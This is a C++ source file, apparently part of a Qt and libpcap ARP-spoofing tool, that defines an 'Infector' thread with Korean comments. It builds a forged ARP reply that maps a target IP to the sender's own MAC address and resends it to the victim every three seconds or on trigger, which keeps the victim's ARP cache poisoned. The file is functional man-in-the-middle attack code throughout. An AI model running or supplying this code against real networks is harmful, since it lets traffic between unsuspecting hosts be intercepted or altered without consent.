#include "infector.h"
#include "pcap.h"

Infector::Infector(const IpFlow& flow, QObject* parent)
    : QThread(parent), flow(flow)
{
    if (flow.handle == nullptr) {
        fprintf(stderr, "[ERROR] Infector: handle is null\n");
        return;
    }

    infectionPacket.eth_.dmac_ = flow.sender_mac;
    infectionPacket.eth_.smac_ = flow.my_mac;
    infectionPacket.eth_.type_ = htons(EthHdr::Arp);

    infectionPacket.arp_.hrd_ = htons(ArpHdr::ETHER);
    infectionPacket.arp_.pro_ = htons(EthHdr::Ip4);
    infectionPacket.arp_.hln_ = Mac::Size;
    infectionPacket.arp_.pln_ = Ip::Size;
    infectionPacket.arp_.op_ = htons(ArpHdr::Reply);
    infectionPacket.arp_.smac_ = flow.my_mac;
    infectionPacket.arp_.sip_ = htonl(flow.target_ip);
    infectionPacket.arp_.tmac_ = flow.sender_mac;
    infectionPacket.arp_.tip_ = htonl(flow.sender_ip);
}

Infector::~Infector() {
    killTrigger();
    wait(); // 안전 종료
    emit logMessage("[Infector] 스레드 종료");
}

void Infector::trigger() {
    mutex.lock();
    triggered = true;
    cond.wakeOne();
    mutex.unlock();
}

void Infector::killTrigger() {
    mutex.lock();
    running = false;
    cond.wakeOne();
    mutex.unlock();
}

void Infector::run() {
    emit logMessage("[Infector] 스레드 시작");

    while (running) {
        mutex.lock();
        cond.wait(&mutex, 3000); // 3초 대기 or trigger 깨움

        if (!running) {
            mutex.unlock();
            break;
        }

        if (triggered) {
            triggered = false;
            sendInfection();
        } else {
            // 주기 감염
            sendInfection();
        }

        mutex.unlock();
    }
}

void Infector::sendInfection() {
    int res = pcap_sendpacket(flow.handle, reinterpret_cast<const u_char*>(&infectionPacket), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "[ERROR] pcap_sendpacket return %d error=%s\n", res, pcap_geterr(flow.handle));
    }
}
